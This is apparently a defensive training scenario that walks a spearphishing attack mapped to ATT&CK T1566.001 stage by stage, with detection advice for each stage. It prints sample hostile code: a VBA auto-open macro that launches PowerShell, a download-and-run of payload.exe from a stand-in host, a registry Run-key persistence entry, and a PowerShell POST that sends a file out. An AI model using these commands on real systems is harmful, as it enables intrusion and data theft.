Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload leading to further exploitation. The attack involves multiple applications, including Outlook for email access, Excel for executing the malicious attachment, and PowerShell for executing additional commands.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Application Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Invoice Attached" and an Excel file named "Invoice_2023.xlsx" as an attachment.
- **Key Artifacts**: 
  - Email Subject: "Invoice Attached"
  - Attachment: `Invoice_2023.xlsx`
- **Detection**: Monitor for suspicious email attachments and subject lines that may indicate spearphishing attempts.

**Stage 2: Opening the Malicious Attachment**
- **Application Involved**: Microsoft Excel
- **User Action**: The user opens the attachment in Excel, which contains a macro designed to execute a PowerShell command.
- **Key Artifacts**: 
  - Excel File: `Invoice_2023.xlsx`
  - Macro Code: 
    ```vba
    Sub Auto_Open()
        Shell "powershell.exe -ExecutionPolicy Bypass -File C:\Users\User\AppData\Local\Temp\malicious.ps1"
    End Sub
    ```
- **Detection**: Monitor for the execution of macros in Excel files, especially those that invoke PowerShell.

**Stage 3: Execution of PowerShell Script**
- **Application Involved**: PowerShell
- **User Action**: The macro executes a PowerShell script located in the Temp directory.
- **Key Artifacts**: 
  - PowerShell Command:
    ```powershell
    Invoke-WebRequest -Uri "http://malicious-website.com/payload.exe" -OutFile "C:\Users\User\AppData\Local\Temp\payload.exe"
    Start-Process "C:\Users\User\AppData\Local\Temp\payload.exe"
    ```
- **Detection**: Monitor for PowerShell commands that download executables from the internet and execute them.

**Stage 4: Payload Execution**
- **Application Involved**: Windows Explorer
- **User Action**: The downloaded executable (`payload.exe`) is executed, establishing a backdoor on the system.
- **Key Artifacts**: 
  - Executable: `payload.exe`
  - Network Indicators: 
    - Outbound connection to `malicious-website.com`
- **Detection**: Monitor for the execution of newly created executables in the Temp directory and any outbound connections to known malicious domains.

**Stage 5: Establishing Persistence**
- **Application Involved**: Registry Editor
- **User Action**: The payload modifies the Registry to ensure it runs on startup.
- **Key Artifacts**: 
  - Registry Key Modification:
    ```reg
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousPayload = "C:\Users\User\AppData\Local\Temp\payload.exe"
    ```
- **Detection**: Monitor for modifications to the Registry keys associated with startup programs.

**Stage 6: Exfiltration of Data**
- **Application Involved**: PowerShell
- **User Action**: The payload uses PowerShell to exfiltrate sensitive data to the attacker's server.
- **Key Artifacts**: 
  - PowerShell Command:
    ```powershell
    Invoke-WebRequest -Uri "http://malicious-website.com/exfiltrate" -Method POST -Body (Get-Content "C:\Users\User\Documents\sensitive_data.txt")
    ```
- **Detection**: Monitor for PowerShell commands that send data to external servers, especially those involving sensitive file paths.
